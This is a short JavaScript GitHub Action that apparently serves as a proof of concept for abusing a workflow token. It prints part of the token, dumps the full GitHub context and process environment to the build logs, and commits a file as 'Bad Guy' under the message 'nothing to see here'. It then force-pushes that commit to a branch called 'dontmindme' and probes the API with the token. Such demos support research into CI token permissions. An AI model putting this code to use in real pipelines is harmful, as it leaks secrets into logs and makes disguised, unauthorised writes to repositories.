const { execSync } = require("child_process");
const core = require("@actions/core");
const github = require("@actions/github");
const https = require("https");

async function run() {
  const token = core.getInput("token");
  console.log(`Got token: ${token.slice(0, 10)}...`);
  // const env = core.getInput("env");
  // console.log(`Got env: ${env}`);
  console.log("github context:");
  console.log(github.context);

  console.log("process env:");
  console.log(process.env);

  const octokit = github.getOctokit(token);
  const name = "Bad Guy";
  const email = "badguy@example.local";
  // can't edit workflows, but try another file
  execSync("cp ruhroh.yml ruhroh-copy.yml");
  execSync("git add ruhroh-copy.yml");
  execSync("git commit -m 'nothing to see here'", {
    env: {
      GIT_COMMITTER_NAME: name,
      GIT_COMMITTER_EMAIL: email,
      GIT_AUTHOR_NAME: name,
      GIT_AUTHOR_EMAIL: email,
    },
  });
  execSync("git push -f origin HEAD:dontmindme");

  try {
    const { data, headers } = await octokit.request("/");
    console.log(data);
    console.log(headers);
  } catch (e) {
    console.log(e);
    core.setFailed(e.message);
    return;
  }
}

run();
